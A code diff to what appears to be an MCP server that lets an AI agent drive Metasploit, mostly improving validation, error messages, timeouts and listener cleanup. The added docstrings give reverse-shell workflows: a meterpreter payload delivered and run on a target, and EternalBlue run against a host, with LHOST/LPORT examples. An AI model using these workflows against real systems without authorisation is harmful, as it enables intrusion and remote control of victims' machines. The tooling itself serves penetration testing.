@@ -28,7 +28,7 @@ logger = logging.getLogger("metasploit_mcp_server")
 session_shell_type: Dict[str, str] = {}
 
 # Metasploit Connection Config (from environment variables)
-MSF_PASSWORD = os.getenv('MSF_PASSWORD', 'yourpassword')
+MSF_PASSWORD = os.getenv('MSF_PASSWORD', 'msf')
 MSF_SERVER = os.getenv('MSF_SERVER', '127.0.0.1')
 MSF_PORT_STR = os.getenv('MSF_PORT', '55553')
 MSF_SSL_STR = os.getenv('MSF_SSL', 'false')
@@ -38,7 +38,7 @@ PAYLOAD_SAVE_DIR = os.environ.get('PAYLOAD_SAVE_DIR', str(pathlib.Path.home() / 
 DEFAULT_CONSOLE_READ_TIMEOUT = 15  # Default for quick console commands
 LONG_CONSOLE_READ_TIMEOUT = 60   # For commands like run/exploit/check
 SESSION_COMMAND_TIMEOUT = 15     # Default for commands within sessions
-SESSION_READ_INACTIVITY_TIMEOUT = 6 # Timeout if no data from session
+SESSION_READ_INACTIVITY_TIMEOUT = 15 # Timeout if no data from session
 EXPLOIT_SESSION_POLL_TIMEOUT = 120 # Max time to wait for session after exploit job
 EXPLOIT_SESSION_POLL_INTERVAL = 3  # How often to check for session
 RPC_CALL_TIMEOUT = 25  # Default timeout for RPC calls like listing modules
@@ -483,9 +483,44 @@ async def _get_module_object(module_type: str, module_name: str) -> Any:
              logger.error(f"MsfRpcError getting module {module_type}/{base_module_name}: {e}")
              raise MsfRpcError(f"Error retrieving module '{module_name}': {e}") from e
 
-async def _set_module_options(module_obj: Any, options: Dict[str, Any]):
-    """Sets options on a module object, performing basic type guessing."""
-    logger.debug(f"Setting options for module {getattr(module_obj, 'fullname', '')}: {options}")
+async def _get_module_valid_options(module_obj: Any) -> set:
+    """Get the set of valid option names for a module by querying Metasploit."""
+    try:
+        # module_obj.options returns a dict of option_name -> option_info
+        options_dict = await asyncio.to_thread(lambda: module_obj.options)
+        if isinstance(options_dict, dict):
+            return set(options_dict.keys())
+        return set()
+    except Exception as e:
+        logger.warning(f"Failed to get valid options for module: {e}")
+        return set()
+
+async def _set_module_options(module_obj: Any, options: Dict[str, Any], module_type: str = "module", payload_obj: Any = None):
+    """Sets options on a module object, performing basic type guessing and intelligent error detection.
+    
+    Args:
+        module_obj: The Metasploit module object
+        options: Options to set on the module
+        module_type: Type of module ('exploit', 'payload', 'auxiliary', etc.)
+        payload_obj: Optional payload object to check if failed options are valid payload options
+    """
+    module_fullname = getattr(module_obj, 'fullname', 'unknown')
+    logger.debug(f"Setting options for module {module_fullname}: {options}")
+    
+    # Get valid options for this module
+    valid_module_options = await _get_module_valid_options(module_obj)
+    logger.debug(f"Module {module_fullname} has {len(valid_module_options)} valid options: {sorted(valid_module_options)}")
+    
+    # Get valid payload options if we have a payload
+    valid_payload_options = set()
+    if payload_obj:
+        valid_payload_options = await _get_module_valid_options(payload_obj)
+        payload_name = getattr(payload_obj, 'fullname', 'unknown')
+        logger.debug(f"Payload {payload_name} has {len(valid_payload_options)} valid options: {sorted(valid_payload_options)}")
+    
+    failed_options = []
+    payload_options_in_module = []
+    
     for k, v in options.items():
         # Basic type guessing
         original_value = v
@@ -506,8 +541,55 @@ async def _set_module_options(module_obj: Any, options: Dict[str, Any]):
             # logger.debug(f"Set option {k}={v} (original: {original_value})")
         except (MsfRpcError, KeyError, TypeError) as e:
              # Catch potential errors if option doesn't exist or type is wrong
-             logger.error(f"Failed to set option {k}={v} on module: {e}")
-             raise ValueError(f"Failed to set option '{k}' to '{original_value}': {e}") from e
+             error_str = str(e)
+             logger.error(f"Failed to set option {k}={v} on module {module_fullname}: {e}")
+             
+             # Check if this option is valid for the payload (intelligent detection)
+             if 'invalid option' in error_str.lower() and k in valid_payload_options:
+                 logger.debug(f"Option {k} is valid for payload but not for module {module_fullname}")
+                 payload_options_in_module.append(k)
+                 failed_options.append((k, original_value, error_str))
+             else:
+                 failed_options.append((k, original_value, error_str))
+    
+    # If we detected payload options in module options, provide helpful error
+    if payload_options_in_module:
+        option_list = ', '.join(payload_options_in_module)
+        payload_name = getattr(payload_obj, 'fullname', 'payload') if payload_obj else 'payload'
+        error_msg = (
+            f"❌ CONFIGURATION ERROR: Payload options ({option_list}) cannot be set on the exploit module.\n\n"
+            f"These options belong to the PAYLOAD ('{payload_name}'), not the exploit module '{module_fullname}'.\n\n"
+            f"🔧 How to fix:\n"
+            f"1. Move {option_list} from 'options' to 'payload_options'\n"
+            f"2. Keep module-specific options (e.g., {', '.join(list(valid_module_options)[:3])}) in 'options'\n\n"
+            f"Example:\n"
+            f"  ✗ WRONG:\n"
+            f"    run_exploit(\n"
+            f"        module_name='{module_fullname}',\n"
+            f"        options={{'RHOSTS': '...', '{payload_options_in_module[0]}': '...', ...}},  # ❌ {payload_options_in_module[0]} here\n"
+            f"        payload_name='{payload_name}')\n\n"
+            f"  ✓ CORRECT:\n"
+            f"    run_exploit(\n"
+            f"        module_name='{module_fullname}',\n"
+            f"        options={{'RHOSTS': '...', ...}},  # ✅ Module options only\n"
+            f"        payload_name='{payload_name}',\n"
+            f"        payload_options={{'{payload_options_in_module[0]}': '...', ...}})  # ✅ Payload options separate\n"
+        )
+        raise ValueError(error_msg)
+    
+    # If we have other failed options, raise an informative error
+    if failed_options:
+        failed_list = [f"{k}='{v}'" for k, v, _ in failed_options[:3]]  # Show first 3
+        error_msg = f"Failed to set option(s) on module '{module_fullname}': {', '.join(failed_list)}. {failed_options[0][2]}"
+        
+        # Add helpful hint about valid options if we have them
+        if valid_module_options:
+            valid_options_sample = ', '.join(sorted(valid_module_options)[:10])
+            if len(valid_module_options) > 10:
+                valid_options_sample += f", ... ({len(valid_module_options)} total)"
+            error_msg += f"\n\nValid options for this module: {valid_options_sample}"
+        
+        raise ValueError(error_msg)
 
 async def _execute_module_rpc(
     module_type: str,
@@ -523,19 +605,23 @@ async def _execute_module_rpc(
     module_obj = await _get_module_object(module_type, module_name) # Handles path variants
     full_module_path = getattr(module_obj, 'fullname', f"{module_type}/{module_name}") # Get canonical name
 
-    await _set_module_options(module_obj, module_options)
-
+    # Prepare payload first if needed, so we can pass it to _set_module_options for intelligent error detection
     payload_obj_to_pass = None
+    payload_obj_for_validation = None
     payload_name_for_log = None
     payload_options_for_log = None
 
-    # Prepare payload if needed (primarily for exploits, also used by start_listener)
     if module_type == 'exploit' and payload_spec:
         if isinstance(payload_spec, str):
              payload_name_for_log = payload_spec
              # Passing name string directly is supported by exploit.execute
              payload_obj_to_pass = payload_name_for_log
              logger.info(f"Executing {full_module_path} with payload '{payload_name_for_log}' (passed as string).")
+             # Try to get payload object for validation (non-blocking if it fails)
+             try:
+                 payload_obj_for_validation = await _get_module_object('payload', payload_name_for_log)
+             except Exception as e:
+                 logger.debug(f"Could not get payload object for validation: {e}")
         elif isinstance(payload_spec, dict) and 'name' in payload_spec:
              payload_name = payload_spec['name']
              payload_options = payload_spec.get('options', {})
@@ -543,7 +629,8 @@ async def _execute_module_rpc(
              payload_options_for_log = payload_options
              try:
                  payload_obj = await _get_module_object('payload', payload_name)
-                 await _set_module_options(payload_obj, payload_options)
+                 payload_obj_for_validation = payload_obj  # Use for validation
+                 await _set_module_options(payload_obj, payload_options, module_type='payload')
                  payload_obj_to_pass = payload_obj # Pass the configured payload object
                  logger.info(f"Executing {full_module_path} with configured payload object for '{payload_name}'.")
              except (ValueError, MsfRpcError) as e:
@@ -552,6 +639,9 @@ async def _execute_module_rpc(
         else:
              logger.warning(f"Invalid payload_spec format: {payload_spec}. Expected string or dict with 'name'.")
              return {"status": "error", "message": "Invalid payload specification format."}
+
+    # Now set module options with payload object available for intelligent error detection
+    await _set_module_options(module_obj, module_options, module_type=module_type, payload_obj=payload_obj_for_validation)
 
     logger.info(f"Executing module {full_module_path} as background job via RPC...")
     try:
@@ -659,7 +749,11 @@ async def _execute_module_rpc(
              missing = getattr(module_obj, 'missing_required', [])
              return {"status": "error", "message": f"Missing/invalid options for {full_module_path}: {e}", "missing_required": missing}
         elif "invalid payload" in error_str:
-             return {"status": "error", "message": f"Invalid payload specified: {payload_name_for_log or 'None'}. {e}"}
+             # Provide helpful error message with suggestions
+             error_msg = f"Invalid payload specified: {payload_name_for_log or 'None'}. "
+             error_msg += f"To view compatible payloads for this exploit, use: list_payloads(exploit_module='{module_name}'). "
+             error_msg += f"Original error: {e}"
+             return {"status": "error", "message": error_msg}
         return {"status": "error", "message": f"Error running {full_module_path}: {e}"}
     except Exception as e:
         logger.exception(f"Unexpected error executing module {full_module_path} via RPC")
@@ -745,6 +839,17 @@ async def _execute_module_console(
                 # Basic error check in setup output
                 if any(err in setup_output for err in ["[-] Error setting", "Invalid option", "Unknown module", "Failed to load"]):
                     error_msg = f"Error during setup command '{cmd}': {setup_output}"
+                    
+                    # Check if this is a payload-related error
+                    if "set PAYLOAD" in cmd and ("Invalid option" in setup_output or "Error setting" in setup_output):
+                        # Extract base module name for error message
+                        base_module_name = module_name
+                        if '/' in module_name:
+                            parts = module_name.split('/')
+                            if parts[0] != 'exploit':
+                                base_module_name = module_name
+                        error_msg += f"\n\nTo view compatible payloads for this exploit, use: list_payloads(exploit_module='{base_module_name}')"
+                    
                     logger.error(error_msg)
                     return {"status": "error", "message": error_msg, "module": full_module_path}
                 
@@ -759,8 +864,16 @@ async def _execute_module_console(
             module_output = await run_command_safely(console, command, execution_timeout=timeout)
             execution_duration = asyncio.get_event_loop().time() - start_execution_time
             
-            logger.info(f"Module execution completed in {execution_duration:.1f}s. "
-                       f"Output length: {len(module_output)} characters")
+            # Check if the command timed out
+            timed_out = module_output.startswith("TIMEOUT_ERROR:")
+            if timed_out:
+                # Remove the TIMEOUT_ERROR: prefix for cleaner output
+                module_output = module_output.replace("TIMEOUT_ERROR:", "").strip()
+                logger.warning(f"Module {full_module_path} timed out after {execution_duration:.1f}s")
+            else:
+                logger.info(f"Module execution completed in {execution_duration:.1f}s. "
+                           f"Output length: {len(module_output)} characters")
+            
             logger.debug(f"Module output preview: {module_output[:200]}{'...' if len(module_output) > 200 else ''}")
 
             # --- Parse Console Output ---
@@ -778,18 +891,41 @@ async def _execute_module_console(
 
             status = "success"
             message = f"{module_type.capitalize()} module {full_module_path} completed via console ({command})."
-            if command in ['exploit', 'run'] and session_id is None and \
+            
+            # Handle timeout case
+            if timed_out:
+                if command in ['exploit', 'run']:
+                    status = "warning"
+                    message = f"{module_type.capitalize()} module {full_module_path} timed out after {timeout}s. "
+                    if session_id is None:
+                        message += "Session may have been created after timeout. Check list_active_sessions() to verify."
+                    else:
+                        message += f"Session {session_id} was detected in partial output."
+                else:
+                    status = "error"
+                    message = f"{module_type.capitalize()} module {full_module_path} timed out after {timeout}s."
+            elif command in ['exploit', 'run'] and session_id is None and \
                any(term in module_output.lower() for term in ['session opened', 'sending stage']):
-                 message += " Session may have opened but ID detection failed or session closed quickly."
+                 message += " Session may have opened but ID detection failed or session closed quickly. Check list_active_sessions() to verify."
                  status = "warning"
             elif command in ['exploit', 'run'] and session_id is not None:
                  message += f" Session {session_id} detected."
 
-            # Check for common failure indicators
-            if any(fail in module_output.lower() for fail in ['exploit completed, but no session was created', 'exploit failed', 'run failed', 'check failed', 'module check failed']):
+            # Check for common failure indicators (but not if we timed out)
+            if not timed_out and any(fail in module_output.lower() for fail in ['exploit completed, but no session was created', 'exploit failed', 'run failed', 'check failed', 'module check failed']):
                  status = "error" if status != "warning" else status # Don't override warning if session might have opened
                  message = f"{module_type.capitalize()} module {full_module_path} execution via console appears to have failed. Check output."
                  logger.error(f"Failure detected in console output for {full_module_path}.")
+                 
+                 # Check if the failure might be payload-related
+                 if payload_name_for_log and any(term in module_output.lower() for term in ['payload', 'incompatible', 'invalid']):
+                     # Extract base module name for error message
+                     base_module_name = module_name
+                     if '/' in module_name:
+                         parts = module_name.split('/')
+                         if parts[0] != 'exploit':
+                             base_module_name = module_name
+                     message += f"\n\nThe failure may be payload-related. To view compatible payloads for this exploit, use: list_payloads(exploit_module='{base_module_name}')"
 
 
             return {
@@ -801,7 +937,9 @@ async def _execute_module_console(
                  "module": full_module_path,
                  "options": module_options,
                  "payload_name": payload_name_for_log,
-                 "payload_options": payload_options_for_log
+                 "payload_options": payload_options_for_log,
+                 "timed_out": timed_out,
+                 "execution_duration": execution_duration
             }
 
         except (RuntimeError, MsfRpcError, ValueError) as e: # Catch errors from run_command_safely or setup
@@ -857,28 +995,63 @@ async def list_exploits(search_term: str = "") -> List[str]:
         return [f"Error: Unexpected error listing exploits: {e}"]
 
 @mcp.tool()
-async def list_payloads(platform: str = "", arch: str = "") -> List[str]:
+async def list_payloads(platform: str = "", arch: str = "", exploit_module: str = "", search_term: str = "") -> List[str]:
     """
-    List available Metasploit payloads, optionally filtered by platform and/or architecture.
+    List available Metasploit payloads, optionally filtered by platform, architecture, exploit module compatibility, and/or search term.
 
     Args:
         platform: Optional platform filter (e.g., 'windows', 'linux', 'python', 'php').
         arch: Optional architecture filter (e.g., 'x86', 'x64', 'cmd', 'meterpreter').
+        exploit_module: Optional exploit module name to list only compatible payloads (e.g., 'windows/smb/ms17_010_eternalblue').
+                       When provided, only payloads compatible with this exploit module will be returned.
+        search_term: Optional search term to filter payloads by name (e.g., 'meterpreter', 'cmd/linux', 'reverse_tcp').
+                    Supports partial matches and wildcards (*). Case-insensitive.
 
     Returns:
-        List of payload names matching filters (max 100).
+        List of payload names matching filters (max 100). If exploit_module is provided, returns compatible payloads for that module.
     """
     client = get_msf_client()
-    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}')")
+    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}', exploit: '{exploit_module or 'Any'}', search: '{search_term or 'Any'}')")
+    
     try:
-        # Add timeout to prevent hanging on slow/unresponsive MSF server
-        logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
-        payloads = await asyncio.wait_for(
-            asyncio.to_thread(lambda: client.modules.payloads),
-            timeout=RPC_CALL_TIMEOUT
-        )
-        logger.debug(f"Retrieved {len(payloads)} total payloads from MSF.")
-        filtered = payloads
+        # If exploit_module is provided, get compatible payloads for that module
+        if exploit_module:
+            logger.info(f"Getting compatible payloads for exploit module: {exploit_module}")
+            try:
+                # Get the module object
+                module_obj = await _get_module_object('exploit', exploit_module)
+                
+                # Get compatible payloads using MSF RPC API
+                # The module.compatible_payloads method returns payloads compatible with the exploit
+                logger.debug(f"Calling module.compatible_payloads for {exploit_module} with {RPC_CALL_TIMEOUT}s timeout...")
+                compatible = await asyncio.wait_for(
+                    asyncio.to_thread(lambda: module_obj.compatible_payloads),
+                    timeout=RPC_CALL_TIMEOUT
+                )
+                logger.debug(f"Retrieved {len(compatible)} compatible payloads for {exploit_module}.")
+                
+                # compatible_payloads returns a list of payload names
+                filtered = compatible
+                
+            except ValueError as ve:
+                # Module not found
+                logger.error(f"Exploit module '{exploit_module}' not found: {ve}")
+                return [f"Error: Exploit module '{exploit_module}' not found. Please verify the module name using list_exploits."]
+            except AttributeError:
+                # If compatible_payloads doesn't exist, inform the caller
+                logger.error(f"Module object for '{exploit_module}' doesn't support compatible_payloads method.")
+                return [f"Error: Exploit module '{exploit_module}' doesn't support querying compatible payloads. Use list_payloads without exploit_module parameter to search all payloads, then manually select appropriate payloads for your exploit."]
+        else:
+            # Add timeout to prevent hanging on slow/unresponsive MSF server
+            logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
+            payloads = await asyncio.wait_for(
+                asyncio.to_thread(lambda: client.modules.payloads),
+                timeout=RPC_CALL_TIMEOUT
+            )
+            logger.debug(f"Retrieved {len(payloads)} total payloads from MSF.")
+            filtered = payloads
+        
+        # Apply platform and arch filters if provided
         if platform:
             plat_lower = platform.lower()
             # Match platform at the start of the payload path segment or within common paths
@@ -887,6 +1060,17 @@ async def list_payloads(platform: str = "", arch: str = "") -> List[str]:
             arch_lower = arch.lower()
             # Match architecture more flexibly (e.g., '/x64/', 'meterpreter')
             filtered = [p for p in filtered if f"/{arch_lower}/" in p.lower() or arch_lower in p.lower().split('/')]
+        
+        # Apply search_term filter if provided
+        if search_term:
+            search_lower = search_term.lower()
+            # Support wildcards by converting * to .* for regex matching
+            if '*' in search_lower:
+                pattern = re.compile(search_lower.replace('*', '.*'))
+                filtered = [p for p in filtered if pattern.search(p.lower())]
+            else:
+                # Simple substring match
+                filtered = [p for p in filtered if search_lower in p.lower()]
 
         count = len(filtered)
         limit = 100
@@ -922,6 +1106,31 @@ async def generate_payload(
     """
     Generate a Metasploit payload using the RPC API (payload.generate).
     Saves the generated payload to a file on the server if successful.
+    
+    IMPORTANT - LISTENER REQUIREMENT:
+    After generating a payload, you MUST use start_listener() to set up a handler that will
+    catch connections from the generated payload when it's executed on a target system.
+    
+    WORKFLOW:
+    1. Call generate_payload() to create the payload file (e.g., .exe, .elf, .py)
+    2. Call start_listener() with matching payload_type, LHOST, and LPORT
+    3. Distribute/execute the generated payload file on the target
+    4. The target will connect back to your listener and establish a session
+    
+    EXAMPLE - CORRECT USAGE:
+        # Step 1: Generate payload
+        result = await generate_payload(
+            payload_type='windows/meterpreter/reverse_tcp',
+            format_type='exe',
+            options={'LHOST': '10.0.0.1', 'LPORT': 4444}
+        )
+        # Step 2: Start matching listener
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)
+        # Step 3: Deliver and execute the payload file on target (outside Metasploit)
+    
+    NOTE: This is different from run_exploit() which automatically handles listener creation
+    when running exploit modules. Use generate_payload() + start_listener() when you need
+    standalone payload files for manual delivery.
 
     Args:
         payload_type: Type of payload (e.g., windows/meterpreter/reverse_tcp).
@@ -976,13 +1185,33 @@ async def generate_payload(
         if not (1 <= reverse_listener_bind_port <= 65535):
             return {"status": "error", "message": "Invalid ReverseListenerBindPort. Must be between 1 and 65535."}
         parsed_options['ReverseListenerBindPort'] = reverse_listener_bind_port
+    
+    # Check LPORT availability if it's a reverse payload (optional warning for payload generation)
+    # This provides early feedback even though the actual bind happens when the payload runs/listener starts
+    if 'LPORT' in parsed_options:
+        lport_value = parsed_options['LPORT']
+        try:
+            lport_int = int(lport_value)
+            # Determine the bind address and port for checking
+            check_bind_address = parsed_options.get('ReverseListenerBindAddress', '0.0.0.0')
+            check_bind_port = parsed_options.get('ReverseListenerBindPort', lport_int)
+            
+            # Check port availability (as a warning, not blocking)
+            port_available, port_error = check_port_available(check_bind_port, check_bind_address)
+            if not port_available:
+                logger.warning(f"Port check during payload generation: {port_error}. "
+                              f"This payload will need a listener on {check_bind_address}:{check_bind_port}")
+                # Note: Not returning error here since payload generation itself doesn't bind the port
+                # The port will be needed when start_listener() or run_exploit() is called later
+        except (ValueError, TypeError) as e:
+            logger.warning(f"Could not validate LPORT value '{lport_value}' during payload generation: {e}")
 
     try:
         # Get the payload module object
         payload = await _get_module_object('payload', payload_type)
 
         # Set payload-specific required options (like LHOST/LPORT)
-        await _set_module_options(payload, parsed_options)
+        await _set_module_options(payload, parsed_options, module_type='payload')
 
         # Set payload generation options in payload.runoptions
         # as per the pymetasploit3 documentation
@@ -1105,13 +1334,42 @@ async def run_exploit(
     """
     Run a Metasploit exploit module with specified options. Handles async (job)
     and sync (console) execution, and includes session polling for jobs.
+    
+    IMPORTANT - LISTENER HANDLING:
+    This function AUTOMATICALLY sets up the necessary listener/handler when you provide
+    a payload_name and payload_options. DO NOT call start_listener() separately for the
+    same payload/port combination - this will cause port conflicts and failures.
+    
+    WHEN TO USE start_listener() vs run_exploit():
+    - Use ONLY run_exploit() when: Running an exploit that needs a reverse shell/meterpreter
+      connection back to you. The exploit will handle the listener automatically.
+    - Use start_listener() ONLY when: 
+      * You need a standalone listener NOT tied to a specific exploit run
+      * You're using manually generated payloads (from generate_payload) that need a handler
+      * You need a persistent listener that survives multiple connection attempts
+      * You're coordinating multi-stage attacks where the listener must exist before the exploit
+    
+    EXAMPLE - CORRECT USAGE (run_exploit handles listener):
+        await run_exploit(
+            module_name='exploit/multi/handler',
+            options={},
+            payload_name='windows/meterpreter/reverse_tcp',
+            payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444}
+        )
+        # No need to call start_listener() - it's automatic!
+    
+    EXAMPLE - INCORRECT USAGE (duplicate listener):
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)  # Creates listener on port 4444
+        await run_exploit(..., payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444})  # FAILS - port already in use!
 
     Args:
         module_name: Name/path of the exploit module (e.g., 'unix/ftp/vsftpd_234_backdoor').
         options: Dictionary of exploit module options (e.g., {'RHOSTS': '192.168.1.1'}).
         payload_name: Name of the payload (e.g., 'linux/x86/meterpreter/reverse_tcp').
+                     When specified, this function AUTOMATICALLY creates the handler/listener.
         payload_options: Dictionary of payload options (e.g., {'LHOST': '...', 'LPORT': ...})
                         or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
+                        AUTOMATICALLY creates the listener on the specified LHOST/LPORT.
         run_as_job: If False (default), run sync via console. If True, run async via RPC.
         check_vulnerability: If True, run module's 'check' action first (if available).
         timeout_seconds: Max time for synchronous run via console.
@@ -1130,6 +1388,22 @@ async def run_exploit(
     payload_spec = None
     if payload_name:
         payload_spec = {"name": payload_name, "options": parsed_payload_options}
+        
+        # Check if LPORT is provided and if the port is available
+        if 'LPORT' in parsed_payload_options:
+            lport_value = parsed_payload_options['LPORT']
+            try:
+                lport_int = int(lport_value)
+                # Determine bind address for port check
+                bind_address = parsed_payload_options.get('ReverseListenerBindAddress', '0.0.0.0')
+                bind_port = parsed_payload_options.get('ReverseListenerBindPort', lport_int)
+                
+                # Check if port is available
+                port_available, port_error = check_port_available(bind_port, bind_address)
+                if not port_available:
+                    return {"status": "error", "message": f"Cannot run exploit: {port_error}"}
+            except (ValueError, TypeError) as e:
+                return {"status": "error", "message": f"Invalid LPORT value '{lport_value}': {e}"}
 
     if check_vulnerability:
         logger.info(f"Performing vulnerability check first for {module_name}...")
@@ -1196,7 +1470,7 @@ async def run_exploit(
 async def run_post_module(
     module_name: str,
     session_id: int,
-    options: Dict[str, Any] = None,
+    options: Optional[Dict[str, Any]] = None,
     run_as_job: bool = False,
     timeout_seconds: int = LONG_CONSOLE_READ_TIMEOUT
 ) -> Dict[str, Any]:
@@ -1588,7 +1862,16 @@ async def send_session_command(
 
 @mcp.tool()
 async def list_listeners() -> Dict[str, Any]:
-    """List all active Metasploit jobs, categorizing exploit/multi/handler jobs."""
+    """
+    List all active Metasploit jobs, categorizing exploit/multi/handler jobs as "handlers".
+    
+    This function returns both:
+    - handlers: Active listeners (exploit/multi/handler) created by start_listener() or run_exploit()
+    - other_jobs: Other background jobs (auxiliary modules, post-exploitation, etc.)
+    
+    Use this to check what listeners are currently active before starting new ones to avoid
+    port conflicts. Each handler entry includes job_id, name, and datastore (with LHOST/LPORT).
+    """
     client = get_msf_client()
     logger.info("Listing active listeners/jobs")
     try:
@@ -1664,6 +1947,41 @@ async def start_listener(
 ) -> Dict[str, Any]:
     """
     Start a new Metasploit handler (exploit/multi/handler) as a background job.
+    
+    CRITICAL - WHEN TO USE THIS vs run_exploit():
+    DO NOT use this function if you're about to call run_exploit() with a payload! 
+    The run_exploit() function AUTOMATICALLY creates its own listener when you provide
+    payload_name and payload_options. Using both will cause port conflicts and failures.
+    
+    USE start_listener() ONLY FOR THESE SCENARIOS:
+    1. Standalone listeners for manually generated payloads (from generate_payload tool)
+       - Example: Generate a .exe payload, then start listener to catch it when executed
+    2. Persistent listeners that must remain active across multiple connection attempts
+       - Example: Setting up a handler before distributing payload files to multiple targets
+    3. Listeners needed BEFORE running non-Metasploit attack tools
+       - Example: Using external tools/scripts that connect back to Metasploit handlers
+    4. Pre-staging listeners for multi-stage attacks where timing is critical
+       - Example: Listener must exist before triggering external payload delivery
+    
+    DO NOT USE start_listener() when:
+    - You're about to call run_exploit() with a payload - it handles the listener automatically
+    - You're running any Metasploit exploit module - use run_exploit() instead
+    
+    EXAMPLE - CORRECT USAGE (standalone listener for generated payload):
+        # Generate a payload executable
+        result = await generate_payload('windows/meterpreter/reverse_tcp', 'exe', 
+                                       lhost='10.0.0.1', lport=4444)
+        # Start listener to catch connections from that payload
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)
+        # Now distribute/execute the generated payload file elsewhere
+    
+    EXAMPLE - INCORRECT USAGE (conflicts with run_exploit):
+        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)  # DON'T DO THIS
+        await run_exploit('exploit/windows/smb/ms17_010_eternalblue',
+                         options={'RHOSTS': '192.168.1.10'},
+                         payload_name='windows/meterpreter/reverse_tcp',
+                         payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444})  # FAILS - port conflict!
+        # CORRECT: Just use run_exploit() alone - it creates the listener automatically
 
     Args:
         payload_type: The payload to handle (e.g., 'windows/meterpreter/reverse_tcp').
@@ -1697,6 +2015,11 @@ async def start_listener(
     is_valid, error_msg = validate_bind_address(bind_address)
     if not is_valid:
         return {"status": "error", "message": f"Invalid ReverseListenerBindAddress: {error_msg}"}
+    
+    # Check if the port is available before trying to bind
+    port_available, port_error = check_port_available(bind_port, bind_address)
+    if not port_available:
+        return {"status": "error", "message": f"Cannot start listener: {port_error}"}
 
     # Parse additional options gracefully
     try:
@@ -1796,26 +2119,136 @@ async def stop_job(job_id: int) -> Dict[str, Any]:
         return {"status": "error", "message": f"Unexpected server error stopping job {job_id}: {e}"}
 
 @mcp.tool()
-async def terminate_session(session_id: int) -> Dict[str, Any]:
+async def kill_all_handler_jobs() -> Dict[str, Any]:
+    """
+    Kill all active handler jobs (exploit/multi/handler).
+    Useful for cleaning up after failed exploits or test runs.
+    
+    Returns:
+        Dictionary with status, count of killed jobs, and details.
+    """
+    client = get_msf_client()
+    logger.info("Killing all handler jobs to release ports")
+    
+    try:
+        # Get all active jobs
+        jobs = await asyncio.to_thread(lambda: client.jobs.list)
+        
+        if not jobs:
+            logger.info("No active jobs to kill")
+            return {
+                "status": "success",
+                "message": "No active jobs found",
+                "handlers_killed": 0,
+                "total_jobs": 0
+            }
+        
+        logger.info(f"Found {len(jobs)} active job(s)")
+        
+        # Find handler jobs
+        handler_jobs = {}
+        for job_id, job_info in jobs.items():
+            if isinstance(job_info, dict):
+                job_name = job_info.get('name', '').lower()
+                # Check if it's a handler job
+                if 'exploit/multi/handler' in job_name or 'handler' in job_name:
+                    handler_jobs[job_id] = job_info
+                    logger.debug(f"Found handler job {job_id}: {job_info.get('name')}")
+        
+        if not handler_jobs:
+            logger.info("No handler jobs found")
+            return {
+                "status": "success",
+                "message": f"No handler jobs found among {len(jobs)} active job(s)",
+                "handlers_killed": 0,
+                "total_jobs": len(jobs)
+            }
+        
+        logger.info(f"Found {len(handler_jobs)} handler job(s) to kill")
+        
+        # Kill each handler job
+        killed_count = 0
+        failed_jobs = []
+        
+        for job_id in handler_jobs.keys():
+            try:
+                logger.info(f"Killing handler job {job_id}...")
+                await asyncio.to_thread(lambda jid=job_id: client.jobs.stop(str(jid)))
+                killed_count += 1
+                logger.info(f"✓ Killed handler job {job_id}")
+            except Exception as e:
+                logger.warning(f"Failed to kill handler job {job_id}: {e}")
+                failed_jobs.append({"job_id": job_id, "error": str(e)})
+        
+        # Verify jobs are gone
+        await asyncio.sleep(1.0)
+        jobs_after = await asyncio.to_thread(lambda: client.jobs.list)
+        
+        still_running = []
+        for job_id in handler_jobs.keys():
+            if job_id in jobs_after:
+                still_running.append(job_id)
+        
+        if still_running:
+            logger.warning(f"{len(still_running)} handler job(s) still running after kill attempt: {still_running}")
+        
+        result_message = f"Killed {killed_count}/{len(handler_jobs)} handler job(s)"
+        if failed_jobs:
+            result_message += f", {len(failed_jobs)} failed"
+        if still_running:
+            result_message += f", {len(still_running)} still running"
+        
+        return {
+            "status": "success" if killed_count > 0 else "warning",
+            "message": result_message,
+            "handlers_killed": killed_count,
+            "handlers_found": len(handler_jobs),
+            "total_jobs": len(jobs),
+            "failed": failed_jobs if failed_jobs else [],
+            "still_running": still_running if still_running else []
+        }
+        
+    except Exception as e:
+        logger.exception("Error killing handler jobs")
+        return {
+            "status": "error",
+            "message": f"Error killing handler jobs: {e}",
+            "handlers_killed": 0
+        }
+
+@mcp.tool()
+async def terminate_session(session_id: int, kill_associated_job: bool = True) -> Dict[str, Any]:
     """
     Forcefully terminate a Metasploit session using the session.stop() method.
+    Optionally kills the associated handler job to release ports.
     
     Args:
         session_id: ID of the session to terminate.
+        kill_associated_job: If True, also kill the handler job that created this session (default: True).
         
     Returns:
         Dictionary with status and result message.
     """
     client = get_msf_client()
     session_id_str = str(session_id)
-    logger.info(f"Terminating session {session_id}")
+    logger.info(f"Terminating session {session_id} (kill_associated_job={kill_associated_job})")
     
     try:
-        # Check if session exists
+        # Check if session exists and get session info
         current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
         if session_id_str not in current_sessions:
             logger.error(f"Session {session_id} not found.")
             return {"status": "error", "message": f"Session {session_id} not found."}
+        
+        session_info = current_sessions[session_id_str]
+        logger.debug(f"Session {session_id} info: {session_info}")
+        
+        # Try to find the associated job ID from session info
+        # Sessions created by handlers typically have via_exploit and via_payload info
+        associated_job_id = None
+        if isinstance(session_info, dict):
+            # Check if there's a job_id field (not always present)
+            associated_job_id = session_info.get('job_id')
             
         # Get a handle to the session
         session = await asyncio.to_thread(lambda: client.sessions.session(session_id_str))
@@ -1827,12 +2260,70 @@ async def terminate_session(session_id: int) -> Dict[str, Any]:
         await asyncio.sleep(1.0)  # Give MSF time to process termination
         current_sessions_after = await asyncio.to_thread(lambda: client.sessions.list)
         
-        if session_id_str not in current_sessions_after:
+        session_terminated = session_id_str not in current_sessions_after
+        result_messages = []
+        
+        if session_terminated:
